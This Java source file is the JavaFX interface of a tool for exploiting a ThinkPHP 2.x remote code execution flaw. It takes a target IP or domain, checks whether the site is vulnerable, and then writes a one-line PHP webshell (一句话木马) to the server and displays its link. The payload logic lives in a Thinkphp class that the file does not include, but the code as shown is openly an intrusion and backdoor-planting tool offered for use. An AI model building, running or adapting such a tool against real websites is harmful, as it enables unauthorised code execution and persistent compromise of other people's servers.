
import javafx.application.Application;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.layout.AnchorPane;
import javafx.stage.Stage;

import java.io.IOException;

public class GuiDemo extends Application {      //创建一个GuiDemo类，GuiDemo继承Application类


    @Override
    public void start(Stage primaryStage) throws Exception {
        //标签
        Label label = new Label("请输入目标");
        label.setLayoutX(5);
        label.setLayoutY(10);
        label.setPrefWidth(70);
        label.setPrefHeight(20);
//        label1.setOpacity(0.5);//设置透明度

        //目标文本框
        TextArea textArea = new TextArea();
        textArea.setLayoutX(75);        //设置文本框的横坐标
        textArea.setLayoutY(5);         //设置文本框的纵坐标
        textArea.setPrefWidth(220);     //设置文本框的宽度
        textArea.setPrefHeight(20);     //设置文本框的高度
        textArea.setText("请输入目标ip或者域名......");
        //验证按钮
        Button button = new Button("验证");
        button.setLayoutX(310);
        button.setLayoutY(10);
        button.setPrefHeight(20);
        button.setPrefWidth(50);

        //传shell按钮
        Button button1 = new Button("写入一句话木马");
        button1.setLayoutX(370);
        button1.setLayoutY(10);
        button1.setPrefHeight(20);
        button1.setPrefWidth(100);

        //结果文本框
        TextArea textArea1 = new TextArea();
        textArea1.setLayoutX(5);        //设置文本框的横坐标
        textArea1.setLayoutY(50);         //设置文本框的纵坐标
        textArea1.setPrefWidth(500);     //设置文本框的宽度
        textArea1.setPrefHeight(300);     //设置文本框的高度
        textArea1.setWrapText(true);

//        设置按钮鼠标点击事件
        button.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {
                String url = textArea.getText();
                try {
                    String response = Thinkphp.run(url);
                    if (response.contains("PHP Version")) {
                        textArea1.setText("存在此漏洞");
                    }
                } catch (IOException e) {
                    textArea1.setText("不存在此漏洞或者网络异常！！！");
                }
            }
        });
        //如果点击上传一句话按钮，那么先判断漏洞是否存在，如果存在就发送上传一句话请求，并且把一句话链接输出到textArea
        button1.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {
                String url = textArea.getText();
                try {
                    String response = Thinkphp.run(url);
                    if (response.contains("PHP Version")) {
                        textArea1.setText("一句话木马是:\n" + Thinkphp.shell(url));
                    }

                } catch (IOException e) {

                    textArea1.setText("不存在此漏洞或者网络异常！！！");
                }
            }
        });


        //布局1
        AnchorPane pane1 = new AnchorPane();
        pane1.getChildren().addAll(label, button, button1, textArea, textArea1);
        //场景
        Scene scene1 = new Scene(pane1, 510, 400);
        //主要的舞台/窗口
        primaryStage.setTitle("ThinkPHP 2.x 任意代码执行漏洞 made by yz");
        primaryStage.setScene(scene1);
        /*窗口设置场景*/
        primaryStage.show();

    }

    public static void main(String args[]) {
        launch(args);
    }
}